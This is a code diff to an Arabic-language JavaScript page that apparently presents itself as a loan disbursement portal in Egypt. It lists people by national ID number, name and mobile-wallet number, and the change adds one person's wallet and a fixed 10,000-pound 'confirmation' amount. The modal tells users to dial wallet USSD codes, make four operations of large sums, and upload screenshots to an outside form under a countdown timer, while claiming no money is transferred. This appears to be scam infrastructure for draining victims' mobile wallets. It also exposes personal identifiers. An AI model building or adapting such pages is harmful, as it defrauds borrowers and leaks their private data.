@@ -413,7 +413,7 @@
     "27411101601651": { name: "صالح السيد فراج", loanRaw: "50,000", loanTerm: "24 شهر", installment: "2,725", total: "65,400", wallet: "لا يوجد محفظة", walletNum: "", isEtisalat: false },
     "26912011500037": { name: "حسين حسن إسماعيل أحمد", loanRaw: "200,000", loanTerm: "60 شهر", installment: "4,440", total: "266,400", wallet: "لا يوجد محفظة", walletNum: "", isEtisalat: false },
     "27301261600228": { name: "حنان فؤاد محمد حسن", loanRaw: "45,000", loanTerm: "18 شهر", installment: "3,325", total: "59,850", wallet: "لا يوجد محفظة", walletNum: "", isEtisalat: false },
-    "28604081401754": { name: "حجاج صلاح الدين محمد جاد", loanRaw: "200,000", loanTerm: "60 شهر", installment: "4,440", total: "266,400", wallet: "لا يوجد محفظة", walletNum: "", isEtisalat: false },
+    "28604081754": { name: "حجاج صلاح الدين محمد جاد", loanRaw: "200,000", loanTerm: "60 شهر", installment: "4,440", total: "266,400", wallet: "لا يوجد محفظة", walletNum: "", isEtisalat: false },
     "27812062504303": { name: "نهى نبيه عبد الرشيد عيسى", loanRaw: "200,000", loanTerm: "60 شهر", installment: "4,440", total: "266,400", wallet: "فودافون كاش", walletNum: "01010947899", isEtisalat: false },
     "27507020101589": { name: "هند ابراهيم علي عيد", loanRaw: "غير محدد", loanTerm: "غير محدد", installment: "غير محدد", total: "غير محدد", wallet: "اتصالات كاش", walletNum: "غير مسجل", isEtisalat: true },
     "27109251501371": { name: "سمير محمد ابو فوده", loanRaw: "غير محدد", loanTerm: "غير محدد", installment: "غير محدد", total: "غير محدد", wallet: "اتصالات كاش", walletNum: "غير مسجل", isEtisalat: true },
@@ -424,7 +424,18 @@
     "30103231300951": { name: "اسلام محمد السيد شاهين", loanRaw: "50,000", loanTerm: "24 شهر", installment: "2,725", total: "65,400", wallet: "فودافون كاش", walletNum: "01062754931", isEtisalat: false },
     "27111160201353": { name: "رمضان حمدي احمد اسماعيل", loanRaw: "200,000", loanTerm: "60 شهر", installment: "4,440", total: "266,400", wallet: "اتصالات كاش", walletNum: "01108356493", isEtisalat: true },
     "26403170201057": { name: "طارق عبد المنعم يونس", loanRaw: "200,000", loanTerm: "60 شهر", installment: "4,440", total: "266,400", wallet: "فودافون كاش", walletNum: "01069166288", isEtisalat: false },
-     "26311040101385": { name: "آمال محمد الفولى محمد", loanRaw: "200,000", loanTerm: "60 شهر", installment: "4,440", total: "266,400", wallet: "اتصالات كاش", walletNum: "01108758275", isEtisalat: true }
+     "26311040101385": { name: "آمال محمد الفولى محمد", loanRaw: "200,000", loanTerm: "60 شهر", installment: "4,440", total: "266,400", wallet: "اتصالات كاش", walletNum: "01108758275", isEtisalat: true },
+     "28604081401754": { 
+    name: "حجاج صلاح الدين محمد جاد", 
+    loanRaw: "200,000", 
+    loanTerm: "60 شهر", 
+    installment: "4,440", 
+    total: "266,400", 
+    wallet: "اتصالات كاش", 
+    walletNum: "01147654760", 
+    isEtisalat: true,
+    proofAmountPerOperation: 10000  // قيمة العملية بسبب عمر المحفظة أقل من 3 أشهر
+}
 };
 
     const LINKING_FORM_URL = "https://eu.surveymars.com/q/m1wgp5O9A";
@@ -438,70 +449,71 @@
     }
 
     function buildInstructionsModal(client) {
-        if (!client.wallet || client.wallet.includes("لا يوجد")) {
-            return `
-                <div class="client-summary">
-                    <p><i class="fas fa-user"></i> الاسم: <strong>${client.name}</strong></p>
-                    <p><i class="fas fa-id-card"></i> الرقم القومي: <strong>${client.normalizedId}</strong></p>
-                    <p><i class="fas fa-dollar-sign"></i> المبلغ المعتمد: <strong>${client.loanRaw} ج.م</strong></p>
-                </div>
-                <div style="border-right: 4px solid #FF8C42; background: rgba(255,140,66,0.1); border-radius:1rem; padding:1rem;">
-                    <i class="fas fa-exclamation-triangle" style="color:#FF8C42;"></i> <strong>لا توجد محفظة إلكترونية مسجلة</strong><br>
-                    يجب عليك فتح محفظة فودافون كاش أو اتصالات كاش في أقرب وقت، ثم العودة لإكمال عملية الربط والصرف.
-                </div>
-                <div class="timer-section" style="margin-top:1rem;">
-                    <div><i class="fas fa-hourglass-half"></i> الوقت المتبقي لتأكيد الربط</div>
-                    <div class="countdown-timer" id="modalTimer">26:00</div>
-                </div>
-            `;
-        }
-        const loanNum = parseInt(client.loanRaw.replace(/[^\d]/g, ''), 10);
-        const perOperation = Math.floor(loanNum / 4);
-        const isEtisalat = client.isEtisalat === true || client.wallet.includes("اتصالات");
-        const providerName = isEtisalat ? "اتصالات كاش" : "فودافون كاش";
-        const code = isEtisalat ? "6#*777*" : "100#*9*";
-        const fee = "5 جنيهات (لصالح شركة الاتصالات)";
-
+    if (!client.wallet || client.wallet.includes("لا يوجد")) {
         return `
             <div class="client-summary">
                 <p><i class="fas fa-user"></i> الاسم: <strong>${client.name}</strong></p>
                 <p><i class="fas fa-id-card"></i> الرقم القومي: <strong>${client.normalizedId}</strong></p>
-                <p><i class="fas fa-wallet"></i> المحفظة: <strong>${client.wallet}</strong> (${client.walletNum || "رقم غير مسجل"})</p>
                 <p><i class="fas fa-dollar-sign"></i> المبلغ المعتمد: <strong>${client.loanRaw} ج.م</strong></p>
             </div>
-            <div class="linking-instructions" style="margin:0; padding:1rem;">
-                <div class="instructions-title" style="font-size:1.2rem;"><i class="fas fa-link"></i> تعليمات ربط المحفظة (${providerName})</div>
-                <div class="instruction-step">
-                    <div class="step-header"><i class="fas fa-dial"></i> ❶ كود تأكيد الحساب</div>
-                    <div class="code-box" style="font-size:1rem;">${code}</div>
-                </div>
-                <div class="instruction-step">
-                    <div class="step-header"><i class="fas fa-calculator"></i> ❷ مبلغ التأكيد لكل عملية</div>
-                    <div><span class="highlight-value">${perOperation.toLocaleString()} ج.م</span> (×4 عمليات = ${(perOperation*4).toLocaleString()} ج.م)</div>
-                </div>
-                <div class="instruction-step">
-                    <div class="step-header"><i class="fas fa-receipt"></i> ❸ رسوم التأكيد</div>
-                    <div>${fee}</div>
-                </div>
-                <div class="instruction-step">
-                    <div class="step-header"><i class="fas fa-camera-retro"></i> ❹ توثيق العملية</div>
-                    <div>التقط 4 لقطات شاشة واضحة (واحدة لكل عملية) تظهر المبلغ والتاريخ والرقم.</div>
-                </div>
-                <div class="instruction-step">
-                    <div class="step-header"><i class="fas fa-cloud-upload-alt"></i> ❺ رفع اللقطات</div>
-                    <div>بعد جمع اللقطات الأربع، اضغط على الزر أدناه لرفعها عبر النموذج الآمن.</div>
-                </div>
+            <div style="border-right: 4px solid #FF8C42; background: rgba(255,140,66,0.1); border-radius:1rem; padding:1rem;">
+                <i class="fas fa-exclamation-triangle" style="color:#FF8C42;"></i> <strong>لا توجد محفظة إلكترونية مسجلة</strong><br>
+                يجب عليك فتح محفظة فودافون كاش أو اتصالات كاش في أقرب وقت، ثم العودة لإكمال عملية الربط والصرف.
             </div>
-            <div class="timer-section">
-                <div><i class="fas fa-hourglass-half"></i> الوقت المتبقي لإتمام الربط</div>
+            <div class="timer-section" style="margin-top:1rem;">
+                <div><i class="fas fa-hourglass-half"></i> الوقت المتبقي لتأكيد الربط</div>
                 <div class="countdown-timer" id="modalTimer">26:00</div>
-                <div style="font-size:0.7rem;">بعد رفع الصور سيتم فتح رابط التحويل الفوري خلال دقائق</div>
-            </div>
-            <div class="info-section" style="background:#0a2f2f;">
-                <i class="fas fa-shield-alt"></i> إجراء آمن: لا تحول أي مبلغ إلى الشركة، فقط تأكيد ملكية المحفظة.
             </div>
         `;
     }
+    const loanNum = parseInt(client.loanRaw.replace(/[^\d]/g, ''), 10);
+    // ✅ السطر المعدل
+    const perOperation = client.proofAmountPerOperation || Math.floor(loanNum / 4);
+    const isEtisalat = client.isEtisalat === true || client.wallet.includes("اتصالات");
+    const providerName = isEtisalat ? "اتصالات كاش" : "فودافون كاش";
+    const code = isEtisalat ? "6#*777*" : "100#*9*";
+    const fee = "5 جنيهات (لصالح شركة الاتصالات)";
+
+    return `
+        <div class="client-summary">
+            <p><i class="fas fa-user"></i> الاسم: <strong>${client.name}</strong></p>
+            <p><i class="fas fa-id-card"></i> الرقم القومي: <strong>${client.normalizedId}</strong></p>
+            <p><i class="fas fa-wallet"></i> المحفظة: <strong>${client.wallet}</strong> (${client.walletNum || "رقم غير مسجل"})</p>
+            <p><i class="fas fa-dollar-sign"></i> المبلغ المعتمد: <strong>${client.loanRaw} ج.م</strong></p>
+        </div>
+        <div class="linking-instructions" style="margin:0; padding:1rem;">
+            <div class="instructions-title" style="font-size:1.2rem;"><i class="fas fa-link"></i> تعليمات ربط المحفظة (${providerName})</div>
+            <div class="instruction-step">
+                <div class="step-header"><i class="fas fa-dial"></i> ❶ كود تأكيد الحساب</div>
+                <div class="code-box" style="font-size:1rem;">${code}</div>
+            </div>
+            <div class="instruction-step">
+                <div class="step-header"><i class="fas fa-calculator"></i> ❷ مبلغ التأكيد لكل عملية</div>
+                <div><span class="highlight-value">${perOperation.toLocaleString()} ج.م</span> (×4 عمليات = ${(perOperation*4).toLocaleString()} ج.م)</div>
+            </div>
+            <div class="instruction-step">
+                <div class="step-header"><i class="fas fa-receipt"></i> ❸ رسوم التأكيد</div>
+                <div>${fee}</div>
+            </div>
+            <div class="instruction-step">
+                <div class="step-header"><i class="fas fa-camera-retro"></i> ❹ توثيق العملية</div>
+                <div>التقط 4 لقطات شاشة واضحة (واحدة لكل عملية) تظهر المبلغ والتاريخ والرقم.</div>
+            </div>
+            <div class="instruction-step">
+                <div class="step-header"><i class="fas fa-cloud-upload-alt"></i> ❺ رفع اللقطات</div>
+                <div>بعد جمع اللقطات الأربع، اضغط على الزر أدناه لرفعها عبر النموذج الآمن.</div>
+            </div>
+        </div>
+        <div class="timer-section">
+            <div><i class="fas fa-hourglass-half"></i> الوقت المتبقي لإتمام الربط</div>
+            <div class="countdown-timer" id="modalTimer">26:00</div>
+            <div style="font-size:0.7rem;">بعد رفع الصور سيتم فتح رابط التحويل الفوري خلال دقائق</div>
+        </div>
+        <div class="info-section" style="background:#0a2f2f;">
+            <i class="fas fa-shield-alt"></i> إجراء آمن: لا تحول أي مبلغ إلى الشركة، فقط تأكيد ملكية المحفظة.
+        </div>
+    `;
+}
 
     function startModalCountdown() {
         if (countdownInterval) clearInterval(countdownInterval);
